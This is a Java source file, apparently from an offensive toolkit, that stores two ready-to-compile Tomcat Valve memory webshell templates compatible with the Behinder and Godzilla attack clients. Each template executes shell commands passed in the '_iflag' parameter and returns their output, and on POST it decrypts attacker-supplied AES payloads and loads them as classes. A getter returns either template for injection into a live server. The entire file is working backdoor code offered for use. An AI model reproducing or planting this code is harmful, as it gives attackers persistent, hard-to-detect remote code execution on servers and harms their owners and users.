package com.droplab.Utils.Memory.Tomcat.Valve;

import com.droplab.Utils.Memory.Interface.ImplInterface;

import java.lang.reflect.Field;

public class ValveImplStr implements ImplInterface {
    private final String valveImplBehinder="import org.apache.catalina.connector.Request;\n" +
            "import org.apache.catalina.connector.Response;\n" +
            "import org.apache.catalina.valves.ValveBase;\n" +
            "\n" +
            "import javax.crypto.Cipher;\n" +
            "import javax.crypto.spec.SecretKeySpec;\n" +
            "import javax.servlet.ServletException;\n" +
            "import javax.servlet.http.HttpSession;\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "import java.io.IOException;\n" +
            "import java.io.InputStream;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.HashMap;\n" +
            "\n" +
            "public class %s extends ValveBase {\n" +
            "\n" +
            "    public %s() {\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void invoke(org.apache.catalina.connector.Request request, org.apache.catalina.connector.Response response) throws IOException, ServletException {\n" +
            "        try {\n" +
            "            String cmd = request.getParameter(\"_iflag\");\n" +
            "            if (cmd != null && !cmd.equals(\"\")) {\n" +
            "                if (request.getMethod().equals(\"POST\")) {\n" +
            "                    try {\n" +
            "                        String k = \"%s\";\n" +
            "                        HttpSession session = request.getSession();\n" +
            "                        session.putValue(\"u\", k);\n" +
            "                        Cipher c = Cipher.getInstance(\"AES\");\n" +
            "                        c.init(2, new SecretKeySpec(k.getBytes(), \"AES\"));\n" +
            "                        HashMap hashMap = new HashMap();\n" +
            "                        hashMap.put(\"request\", request);\n" +
            "                        hashMap.put(\"response\", response);\n" +
            "                        hashMap.put(\"session\", session);\n" +
            "                        ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();\n" +
            "                        Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");\n" +
            "                        Method defineClass = aClass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "                        defineClass.setAccessible(true);\n" +
            "                        byte[] decode = c.doFinal(java.util.Base64.getDecoder().decode(request.getReader().readLine()));\n" +
            "                        Class lisi = (Class) defineClass.invoke(clzLoader, decode, 0, decode.length);\n" +
            "                        lisi.newInstance().equals(hashMap);\n" +
            "                    } catch (Exception e) {\n" +
            "                        getNext().invoke(request, response);\n" +
            "                    }\n" +
            "                } else {\n" +
            "                    InputStream in = Runtime.getRuntime().exec(cmd.trim().split(\" \")).getInputStream();\n" +
            "                    ByteArrayOutputStream os = new ByteArrayOutputStream();\n" +
            "                    byte[] bytes = new byte[1024];\n" +
            "                    int a = -1;\n" +
            "                    while ((a = in.read(bytes)) != -1) {\n" +
            "                        os.write(bytes, 0, a);\n" +
            "                    }\n" +
            "                    response.getWriter().println(new String(os.toByteArray()));\n" +
            "                }\n" +
            "            } else {\n" +
            "                getNext().invoke(request, response);\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "            getNext().invoke(request, response);\n" +
            "        }\n" +
            "    }\n" +
            "}";


    private final String valveImplGodzilla="import org.apache.catalina.connector.Request;\n" +
            "import org.apache.catalina.connector.Response;\n" +
            "import org.apache.catalina.valves.ValveBase;\n" +
            "import javax.crypto.Cipher;\n" +
            "import javax.crypto.spec.SecretKeySpec;\n" +
            "import javax.servlet.ServletException;\n" +
            "import javax.servlet.http.HttpSession;\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "import java.io.IOException;\n" +
            "import java.io.InputStream;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.Base64;\n" +
            "public class %s extends ValveBase {\n" +
            "    public %s() {\n" +
            "    }\n" +
            "    @Override\n" +
            "    public void invoke(Request request, Response response) throws IOException, ServletException {\n" +
            "        try {\n" +
            "            String cmd = request.getParameter(\"_iflag\");\n" +
            "            if (cmd != null && !cmd.equals(\"\")) {\n" +
            "                if (request.getMethod().equals(\"POST\")) {\n" +
            "                    try {\n" +
            "                        String xc = \"2f2e9f40c6d9fa47\";\n" +
            "                        String pass = \"%s\";\n" +
            "                        String md5 = \"%s\".toUpperCase();\n" +
            "                        ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();\n" +
            "                        Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");\n" +
            "                        Method defineClass = aClass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "                        defineClass.setAccessible(true);\n" +
            "                        byte[] data = Base64.getDecoder().decode(request.getParameter(pass));\n" +
            "                        Cipher c = Cipher.getInstance(\"AES\");\n" +
            "                        c.init(2, new SecretKeySpec(xc.getBytes(), \"AES\"));\n" +
            "                        byte[] bytes = c.doFinal(data);\n" +
            "                        HttpSession session = request.getSession();\n" +
            "                        if (session.getAttribute(\"payload\") == null) {\n" +
            "                            session.setAttribute(\"payload\", defineClass.invoke(clzLoader,bytes,0,bytes.length));\n" +
            "                        }else {\n" +
            "                            request.setAttribute(\"parameters\", bytes);\n" +
            "                            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n" +
            "                            Object f = ((Class) session.getAttribute(\"payload\")).newInstance();\n" +
            "                            f.equals(arrOut);\n" +
            "                            f.equals(bytes);\n" +
            "                            response.getWriter().write(md5.substring(0, 16));\n" +
            "                            f.toString();\n" +
            "                            c.init(1,new SecretKeySpec(xc.getBytes(),\"AES\"));\n" +
            "                            byte[] bytes1 = c.doFinal(arrOut.toByteArray());\n" +
            "                            response.getWriter().write(java.util.Base64.getEncoder().encodeToString(bytes1));\n" +
            "                            response.getWriter().write(md5.substring(16));\n" +
            "                        }\n" +
            "                    } catch (Exception e) {\n" +
            "                        getNext().invoke(request, response);\n" +
            "                    }\n" +
            "                } else {\n" +
            "                    InputStream in = Runtime.getRuntime().exec(cmd.trim().split(\" \")).getInputStream();\n" +
            "                    ByteArrayOutputStream os = new ByteArrayOutputStream();\n" +
            "                    byte[] bytes = new byte[1024];\n" +
            "                    int a = -1;\n" +
            "                    while ((a = in.read(bytes)) != -1) {\n" +
            "                        os.write(bytes, 0, a);\n" +
            "                    }\n" +
            "                    response.getWriter().println(new String(os.toByteArray()));\n" +
            "                }\n" +
            "            } else {\n" +
            "                getNext().invoke(request, response);\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "            getNext().invoke(request, response);\n" +
            "        }\n" +
            "    }\n" +
            "}";

    @Override
    public String get(Object obj,String type,boolean template) {
        //org.apache.catalina.connector
        try {
            Field declaredField = obj.getClass().getDeclaredField("valveImpl" + type);
            declaredField.setAccessible(true);
            return (String) declaredField.get(obj);
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}